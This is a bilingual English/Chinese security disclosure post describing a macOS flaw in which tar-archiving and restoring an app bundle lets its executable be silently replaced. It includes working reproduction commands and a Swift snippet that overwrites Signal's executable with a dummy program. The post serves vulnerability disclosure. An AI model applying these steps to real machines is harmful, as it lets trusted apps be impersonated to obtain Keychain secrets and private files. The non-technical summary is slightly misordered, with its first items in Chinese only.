# Silent Replacement of Trusted macOS App Executables  
# 静默替换受信任的 macOS 应用程序可执行文件  

2026-07-23 by Talal Haj Bakry and Tommy Mysk  
2026-07-23 作者：Talal Haj Bakry 和 Tommy Mysk  

A vulnerability in macOS allows an attacker to silently replace the main executable of any application downloaded from the web without requiring elevated privileges. As a result, trusted applications can be made to execute attacker-controlled code without triggering security warnings when relaunched. Apple assessed the reported behaviour as not requiring a security fix.  
macOS 中的一个漏洞允许攻击者在无需提升权限的情况下，静默替换从网络下载的任何应用程序的主可执行文件。因此，受信任的应用程序在重新启动时可以在不触发安全警告的情况下执行攻击者控制的代码。苹果评估认为报告的行为不需要安全修复。  

## Affected Platforms  
## 受影响的平台  

*   macOS Tahoe 26.0.0 – 26.5.2  
*   macOS Golden Gate 27 beta 1, 2, 3, and 4  
*   较早版本的 macOS 可能也受影响，但尚未经过测试。  

## Summary  
## 摘要  

macOS provides several safeguards to prevent applications and scripts from tampering with other installed applications. In this post, we show a bug in macOS that allows an attacker to:  
macOS 提供了多项保护措施，以防止应用程序和脚本篡改其他已安装的应用程序。在本文中，我们展示了 macOS 中的一个漏洞，该漏洞允许攻击者：  

1.  Silently replace an application’s main executable under `/Contents/MacOS/` without triggering an authorization prompt.  
    在 `/Contents/MacOS/` 下静默替换应用程序的主可执行文件，而不会触发授权提示。  
2.  Relaunch the modified application normally, without displaying any security warnings.  
    正常重新启动修改后的应用程序，而不显示任何安全警告。  
3.  Impersonate the trusted application in system permission prompts to request access to Keychain secrets and files protected by Transparency, Consent, and Control (TCC), including those inside `~/Desktop` and `~/Documents`.  
    在系统权限提示中冒充受信任的应用程序，以请求访问钥匙串密码以及受透明度、同意和控制（TCC）保护的文件，包括 `~/Desktop` 和 `~/Documents` 中的文件。  

The attack requires only code execution as the current user, and does not require elevated privileges.  
该攻击仅需要以当前用户身份执行代码，不需要提升的权限。

## 非技术读者摘要

我们发现了一个 macOS 安全问题，苹果已调查但决定不修复。如果您在 Mac 上运行恶意应用程序或脚本，攻击者可能：

    将您已从网络安装的受信任应用程序静默替换为恶意版本。

    以这些受信任应用程序的名义请求访问私人数据的权限，包括您期望为私密的文件（如桌面或文档文件夹）或您的钥匙串。  
3.  Replacing a trusted app requires neither your Mac’s password nor any special approval, and it can happen entirely in the background.  
    替换受信任的应用程序既不需要您的 Mac 密码，也不需要任何特殊批准，并且可以完全在后台发生。  
4.  Accessing protected data still requires your approval, but the macOS system prompts show the trusted app’s name and icon, making the requests appear to come from the real app.  
    访问受保护的数据仍然需要您的批准，但 macOS 系统提示会显示受信任应用程序的名称和图标，使请求看起来来自真实的应用程序。  

## Background  
## 背景  

### macOS Application Bundles  
### macOS 应用程序捆绑包  

On macOS, apps are distributed as application bundles, which are directory structures that appear as a single `.app` file in Finder. An application bundle contains the app’s executable, resources such as icons and artwork, embedded frameworks and libraries, and metadata. Apple’s documentation describes the bundle format in more detail.  
在 macOS 上，应用程序以应用程序捆绑包的形式分发，这是在访达中显示为单个 `.app` 文件的目录结构。应用程序捆绑包包含应用程序的可执行文件、图标和 artwork 等资源、嵌入的框架和库以及元数据。苹果的文档更详细地描述了捆绑包格式。  

When a user downloads an app from the Internet and launches it for the first time, macOS verifies its code signature and notarization and applies Gatekeeper policies to determine whether the app is trusted to run.  
当用户从互联网下载应用程序并首次启动时，macOS 会验证其代码签名和公证，并应用 Gatekeeper 策略来确定该应用程序是否受信任可以运行。  

After the app is installed (for example, by dragging it into `/Applications`) and opened, macOS also protects the contents of its bundle. Other applications and scripts, even those running with administrator privileges, cannot modify files inside it. macOS blocks any such attempt and alerts the user that it prevented the modification.  
在应用程序安装（例如，将其拖入 `/Applications`）并打开后，macOS 还会保护其捆绑包的内容。其他应用程序和脚本，即使是那些以管理员权限运行的，也无法修改其中的文件。macOS 会阻止任何此类尝试，并警告用户其阻止了修改。  

### Archive and Restore  
### 归档与恢复  

We accidentally discovered a scenario in which any application or script running with the current user’s privileges can silently replace the main executable of an application bundle and launch the modified application without triggering a code-signature or security warning.  
我们偶然发现了一种情况，即任何以当前用户权限运行的应用程序或脚本都可以静默替换应用程序捆绑包的主可执行文件，并启动修改后的应用程序，而不会触发代码签名或安全警告。  

The issue is reproducible when:  
在以下情况下，此问题可重现：  

*   The app was downloaded from the web rather than installed through the Mac App Store. App Store apps are owned by `root`, while apps downloaded from the web are typically owned by the current user.  
    应用程序是从网络下载的，而不是通过 Mac App Store 安装的。App Store 应用程序由 `root` 拥有，而从网络下载的应用程序通常由当前用户拥有。  
*   The app has already been launched at least once, allowing Gatekeeper to complete its initial verification.  
    该应用程序至少已启动过一次，允许 Gatekeeper 完成其初始验证。  
*   The attacker already has code execution as the current user, for example through a malicious app or downloaded script.  
    攻击者已经以当前用户身份执行代码，例如通过恶意应用程序或下载的脚本。  

We’ll use Signal as an example. To be clear, this is not a Signal vulnerability. Signal is simply a convenient demonstration target because it is widely trusted and distributed outside the Mac App Store. The same behaviour affects other apps downloaded from the web, including Brave Browser, Cursor, Mullvad Browser, Proton Mail, Slack, Visual Studio Code, Xcode, and many others.  
我们将以 Signal 为例。需要明确的是，这不是 Signal 的漏洞。Signal 仅仅是一个方便的演示目标，因为它被广泛信任并在 Mac App Store 之外分发。相同的行为会影响从网络下载的其他应用程序，包括 Brave Browser、Cursor、Mullvad Browser、Proton Mail、Slack、Visual Studio Code、Xcode 等许多其他应用。  

After installing Signal and launching it once, macOS prevents subsequent modifications to its application bundle. You can verify this by running:  
安装 Signal 并启动一次后，macOS 会阻止对其应用程序捆绑包的后续修改。您可以通过运行以下命令验证：  

```bash
% touch /Applications/Signal.app/Contents/MacOS/Signal
touch: /Applications/Signal.app/Contents/MacOS/Signal: Operation not permitted
```

Even with `sudo`, you still cannot modify the application’s main executable:  
即使使用 `sudo`，您仍然无法修改应用程序的主可执行文件：  

```bash
% sudo touch /Applications/Signal.app/Contents/MacOS/Signal
touch: /Applications/Signal.app/Contents/MacOS/Signal: Operation not permitted
```

However, archiving the application bundle with `tar`, deleting the original, and extracting the archive back into `/Applications` changes this behaviour:  
然而，使用 `tar` 归档应用程序捆绑包，删除原始文件，然后将归档提取回 `/Applications` 会改变这种行为：  

```bash
% cd /Applications/
% tar cf .Signal.tar Signal.app
% rm -rf Signal.app
% tar xf .Signal.tar -C /Applications
```

The restored app launches normally, despite being a different copy of the original bundle. What’s surprising is that its contents can be modified without triggering an authorization prompt:  
恢复的应用程序正常启动，尽管它是原始捆绑包的不同副本。令人惊讶的是，可以在不触发授权提示的情况下修改其内容：  

```bash
% touch /Applications/Signal.app/Contents/MacOS/Signal
% It works!
```

Video: Archiving and restoring an application bundle allows it to be modified without requiring user authorization.  
视频：归档和恢复应用程序捆绑包允许在无需用户授权的情况下对其进行修改。  

At this point, replacing the app’s main executable is straightforward. The modified app continues to launch, and macOS displays neither a Gatekeeper warning nor any indication that its bundle has been altered.  
此时，替换应用程序的主可执行文件很简单。修改后的应用程序继续启动，macOS 既不显示 Gatekeeper 警告，也不显示其捆绑包已被更改的任何迹象。  

Here’s a minimal example that uses Swift to compile a dummy executable and then replaces Signal’s main executable with it:  
以下是一个使用 Swift 编译虚拟可执行文件，然后用其替换 Signal 主可执行文件的最小示例：  

```swift
# Write a minimal Swift program that shows a window
cat << EOF > /tmp/dummy.swift
import Cocoa
let app = NSApplication.shared
let window = NSWindow(
    contentRect: NSRect(x: 0, y: 0, width: 200, height: 100),
    styleMask: [.titled, .closable],
    backing: .buffered, defer: false)
window.title = "Dummy"
window.makeKeyAndOrderFront(nil)
app.run()
EOF

# Compile the dummy executable
swiftc /tmp/dummy.swift -o /tmp/dummy

# Replace Signal's executable with the dummy one
cp /tmp/dummy /Applications/Signal.app/Contents/MacOS/Signal
```
